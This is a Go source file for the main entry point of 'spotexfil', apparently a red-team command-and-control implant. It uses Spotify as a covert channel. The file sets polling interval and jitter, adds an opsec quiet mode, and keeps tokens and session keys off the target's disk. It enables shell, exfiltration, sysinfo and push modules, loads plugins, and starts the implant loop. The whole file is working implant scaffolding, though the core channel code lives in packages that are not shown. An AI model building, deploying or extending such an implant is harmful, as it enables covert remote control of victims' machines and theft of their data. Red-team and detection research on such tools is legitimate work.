// Package main provides the minimal spotexfil implant binary.
//
// Unlike cmd/spotexfil (full CLI: operator console, exfil send/receive,
// cobra), this binary contains ONLY the C2 implant — built with
// -tags implantonly to exclude the operator console (readline), using
// stdlib flag instead of cobra. Add -tags noscreenshot to also drop the
// screenshot module and its platform dependencies.
package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/sourcefrenchy/spotexfil/internal/c2"
	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

var version = "dev"

func main() {
	interval := flag.Int("interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
	jitter := flag.Int("jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
	quiet := flag.Bool("quiet", false, "Suppress non-error output (opsec)")
	q := flag.Bool("q", false, "Shorthand for --quiet")
	keyFile := flag.String("key-file", "", "Write session key to this file (0600) instead of stdout")
	tokenFile := flag.String("token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
	modules := flag.String("modules", "", "Comma-separated module allowlist (e.g. shell,exfil,sysinfo,push) — empty = all")
	pluginDir := flag.String("plugin-dir", "", "Directory containing .so plugin modules")
	showVersion := flag.Bool("version", false, "Print version and exit")
	flag.Parse()

	if *showVersion {
		fmt.Printf("spotexfil-implant %s (protocol v%d)\n", version, shared.Proto.Version)
		return
	}
	quietMode := *quiet || *q

	// Auto-generate the session key. In quiet mode it must go to a file,
	// never stdout (scrollback/logs).
	key, err := crypto.GeneratePassphrase()
	if err != nil {
		fatal(err)
	}
	if err := c2.DeliverSessionKey(key, *keyFile, quietMode, os.Stdout); err != nil {
		fatal(err)
	}

	// Load plugins if directory specified
	if *pluginDir != "" {
		if err := c2.LoadPlugins(*pluginDir); err != nil {
			fmt.Printf("[!] Plugin loading error: %v\n", err)
		}
	}

	cfg, err := spotify.LoadConfig()
	if err != nil {
		fatal(err)
	}

	// Implant opsec: never run interactive OAuth on the target, never
	// drop a token cache file on disk. Token must be pre-staged.
	client, err := spotify.NewClientWithOptions(cfg, spotify.ClientOptions{
		UseCoverNames: true,
		AllowOAuth:    false,
		PersistToken:  false,
		TokenFile:     *tokenFile,
	})
	if err != nil {
		fatal(err)
	}

	var allowed []string
	if *modules != "" {
		for _, m := range strings.Split(*modules, ",") {
			if m = strings.TrimSpace(m); m != "" {
				allowed = append(allowed, m)
			}
		}
	}

	implant := c2.NewImplantWithOptions(client, key, c2.ImplantOptions{
		Interval:       *interval,
		Jitter:         *jitter,
		Quiet:          quietMode,
		AllowedModules: allowed,
	})
	implant.Run()
}

func fatal(err error) {
	fmt.Fprintf(os.Stderr, "Error: %v\n", err)
	os.Exit(1)
}
